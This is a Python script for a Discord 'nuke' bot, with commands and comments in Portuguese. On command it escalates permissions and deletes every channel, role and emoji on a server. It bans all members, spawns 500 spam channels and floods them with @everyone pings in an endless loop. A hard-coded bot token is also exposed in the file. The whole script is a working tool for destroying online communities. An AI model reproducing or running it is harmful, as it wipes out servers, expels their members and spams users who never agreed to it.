import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import time
import random
import youtube_dl
import colorama
from colorama import Fore, Style

token="MTE1Mjk4NTYwNDkzNDYxOTI0OA.GH1zI1.sigcw9J40ZDpJ-vX0GdmefeFObErinFh2rmTng"

SPAM_CHANNEL =  ["shakyking"]
SPAM_MESSAGE = ["||@everyone|| <:shakybombadokkkkkkkkk:1290701799665434765> !"]

client = commands.Bot(command_prefix=".")

@client.event
async def on_ready():
   print('''
         

         
                                         ██████  ██░ ██  ▄▄▄       ██ ▄█▀▓██   ██▓
                                        ██    ▒ ▓██░ ██▒▒████▄     ██▄█▒  ▒██  ██▒
                                      ░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▓███▄░   ▒██ ██░
                                        ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▓██ █▄   ░ ▐██▓░
                                      ▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒▒██▒ █▄  ░ ██▒▓░
                                      ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▒ ▓▒   ██▒▒▒ 
                                      ░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒ ▒░ ▓██ ░▒░ 
                                      ░  ░  ░   ░  ░░ ░  ░   ▒   ░ ░░ ░  ▒ ▒ ░░  
                                            ░   ░  ░  ░      ░  ░░  ░    ░ ░     

         




                                          .p parar
                                          .s nuke
                                          .n alterar nome
                                          .f remover foto do servidor
                                          .cc criar cargo (king)
                                          .c @usuário @cargo (king)
 ''')
   await client.change_presence(activity=discord.Game(name="await client.change_presence(activity=discord.Game(name=""))"))

@client.command()
async def p(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} off." + Fore.RESET)

#nuke .s

@client.command()
async def s(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone <3 love u")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "⃟" + Fore.RESET)
    except:
      print(Fore.GREEN + "⃟" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} ⃟" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} ⃟" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} ⃟" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} ⃟" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} ⃟" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} ⃟" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} ⃟" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} ⃟" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("shakyjoinedthegame")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} ⃟" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} ⃟" + Fore.RESET)
    await guild.create_text_channel("chatbaguncinha")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"inv: {link} https://discord.gg/255SjmcVRA")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuke has been {guild.name} sucess")

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

#criar cargo .cc

@client.command()
async def cc(ctx):
    # cria o cargo com permissão de administrador e cor vermelha
    role = await ctx.guild.create_role(name="king", permissions=discord.Permissions(administrator=True), color=discord.Color.purple())
    
    # permite que o cargo seja mencionado
    await role.edit(mentionable=True)

    # exibe o cargo separadamente dos membros conectados
    await role.edit(hoist=True)

    await ctx.send("<:prontinhoshaky:1290702471714308147>")

#dar cargo .cargo

@client.command()
async def c(ctx, membro: discord.Member, cargo: discord.Role):
    await membro.add_roles(cargo)
    await ctx.send(f'<:shakybombadokkkkkkkkk:1290701799665434765>')

#alterar foto .f

@client.command()
async def f(ctx, membro: discord.Member = None):
    guild = ctx.guild
    try:
        await guild.edit(icon=None)
        await ctx.send(f'<:whysoserius:1290702234908229662>')
    except:
        await ctx.send(f'fail')

#alterar nome .n

@client.command()
async def n(ctx, membro: discord.Member = None):
    guild = ctx.guild
    try:
        await guild.edit(name="shaky")
        await ctx.send(f'<:shakyEdiscord:1290701937288937583>')
    except:
        await ctx.send(f'fail')

client.run(token, bot=True)

#nuke simples :)